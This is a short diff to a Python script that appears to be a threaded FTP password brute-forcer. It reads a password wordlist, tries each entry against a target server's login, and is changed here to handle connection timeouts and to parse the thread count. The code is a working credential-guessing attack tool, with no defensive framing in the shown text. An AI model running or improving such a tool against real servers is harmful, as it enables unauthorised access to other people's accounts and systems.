@@ -22,10 +22,14 @@ def connect_ftp():
 
         print("[!] Trying", password)
         try:
-            server.connect(host, port, timeout=5)    # tries to connect to FTP server with a timeout of 5
-
+            # tries to connect to FTP server with a timeout of 5
+            server.connect(host, port, timeout=5)    
             # login using the credentials (user & password)
             server.login(user, password)
+        except TimeoutError:
+            # timeout error
+            print("Timed out: " + "password: " + password)
+            pass
         except ftplib.error_perm:
             # login failed, wrong credentials
             pass
@@ -60,7 +64,7 @@ if __name__ == "__main__":
     user = args.user
     passlist = args.passlist
     # number of threads to spawn
-    n_threads = args.threads
+    n_threads = int(args.threads)
     # read the wordlist of passwords
     passwords = open(passlist).read().split("\n")
 
